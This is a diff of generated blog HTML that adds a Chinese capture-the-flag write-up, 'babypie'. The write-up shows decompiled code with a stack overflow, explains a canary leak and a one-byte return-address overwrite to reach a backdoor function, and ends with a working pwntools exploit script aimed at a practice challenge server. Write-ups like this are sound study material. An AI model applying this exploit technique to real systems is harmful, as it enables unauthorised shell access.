@@ -10,6 +10,8 @@
 
     <!--Description-->
     
+        <meta name="description" content="babypie">
+    
 
     <!--Author-->
     
@@ -18,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="b4nd1t"/>
+        <meta property="og:title" content="babypie"/>
     
 
     <!--Open Graph Description-->
@@ -29,7 +31,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website" />
+        <meta property="og:type" content="article" />
     
 
     <!--Page Cover-->
@@ -43,7 +45,7 @@
 
     <!-- Title -->
     
-    <title>Archives - b4nd1t</title>
+    <title>babypie - b4nd1t</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -132,9 +134,7 @@
 <div class="container">
 
     <!-- Main Content -->
-    
-
-<div class="row">
+    <div class="row">
     <div class="col-sm-12">
 
         <!--Title and Logo-->
@@ -142,34 +142,75 @@
     <div class="logo">
         <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">Archives</h1>
-        
     </div>
 </header>
 
-        <section class="main archive-container">
+        <section class="main">
             
-                <div class="archive-post">
-    <a href="/2023/03/18/pwn1/">
-        <span class="archive-date">
-            Mar 2023
-        </span>
-        npuctf_2020_level2
-    </a>
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2023/03/19/babypie/">
+                babypie
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-03-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/pwn/">pwn</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="babypie"><a href="#babypie" class="headerlink" title="babypie"></a>babypie</h1><span id="more"></span>
+
+<h2 id="1-保护检查"><a href="#1-保护检查" class="headerlink" title="1.保护检查"></a>1.保护检查</h2><p><img src="/../img/1679227585629.png" alt="1679227585629"></p>
+<p>开启了pie保护，也有canary</p>
+<h2 id="2-源码分析"><a href="#2-源码分析" class="headerlink" title="2.源码分析"></a>2.源码分析</h2><p>主函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  sub_960(a1, a2, a3);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入sub_960()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_960()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[6]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line"></span><br><span class="line">  buf[5] = __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  memset(buf, 0, 32);</span><br><span class="line">  puts(&quot;Input your Name:&quot;);</span><br><span class="line">  read(0, buf, 0x30uLL);</span><br><span class="line">  printf(&quot;Hello %s:\n&quot;, (const char *)buf);</span><br><span class="line">  read(0, buf, 0x60uLL);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/1679228062188.png" alt="1679228062188"></p>
+<p>buf有48个字节，第一次输入是48字节，不能进行溢出，但是可以填写特定数量的字节泄露canary。第二次输入96个字节，肯定可以溢出。那么思路就是第一次输入泄露canary，第二次输入进行溢出。</p>
+<p><img src="/../img/1679228140419.png" alt="1679228140419"></p>
+<p>程序中已经给出了后门</p>
+<p><img src="/../img/1679228862642.png" alt="1679228862642"></p>
+<p>后门的偏移为0xa3f</p>
+<p><img src="/../img/1679228918952.png" alt="1679228918952"></p>
+<p>在调试时看到原来存储的返回地址偏移为a6a,所以在第二次溢出时只需覆盖返回地址的一个字节就能拿到shell。</p>
+<h2 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = process(&quot;./buu&quot;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,27327)</span><br><span class="line">sh = 0xa3f</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &#x27;a&#x27;*40 + &#x27;b&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&quot;aab&quot;)</span><br><span class="line">canary = u64(p.recv(7).ljust(8,&quot;\x00&quot;)) * 0x100</span><br><span class="line">p.recv()</span><br><span class="line">payload = &#x27;a&#x27;*40 + p64(canary) + &#x27;a&#x27;*8 + &quot;\x3f&quot;</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/1679229342799.png" alt="1679229342799"></p>
+
+    </div>
+
+    
+
+    
+
+    <!-- Comments -->
+    
+
 </div>
-            
-                <div class="archive-post">
-    <a href="/2023/03/19/babypie/">
-        <span class="archive-date">
-            Mar 2023
-        </span>
-        babypie
-    </a>
-</div>
-            
         </section>
+
     </div>
 </div>
+
 
 </div>
 
